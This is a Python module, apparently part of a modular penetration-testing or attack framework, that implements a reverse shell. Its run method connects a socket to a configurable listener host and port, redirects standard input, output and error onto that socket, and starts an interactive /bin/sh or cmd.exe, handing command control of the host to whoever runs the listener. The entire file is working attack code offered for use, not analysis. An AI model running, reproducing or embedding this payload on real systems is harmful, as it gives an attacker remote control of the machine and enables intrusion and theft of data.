import socket
import subprocess
import os
from core.base_module import BaseModule
from rich.console import Console

class ReverseShell(BaseModule):
    """Establishes a reverse shell connection to a listener."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'LHOST': ['127.0.0.1', 'The listening host (your IP).'],
            'LPORT': [4444, 'The listening port.']
        }

    def run(self, options):
        """
        Connects back to the listener and provides a shell.
        """
        lhost = options.get('LHOST')
        lport = int(options.get('LPORT'))
        console = Console()

        console.print(f"[*] Attempting to connect back to {lhost}:{lport}...")

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((lhost, lport))
            console.print("[bold green][+] Connection established![/bold green]")

            # Redirect stdin, stdout, and stderr to the socket
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            # Start a shell
            p = subprocess.call(["/bin/sh", "-i"] if os.name != 'nt' else ["cmd.exe"])

        except ConnectionRefusedError:
            console.print(f"[!] Connection refused. Is the listener running on {lhost}:{lport}?", style="bold red")
        except Exception as e:
            console.print(f"[!] An error occurred: {e}", style="bold red")
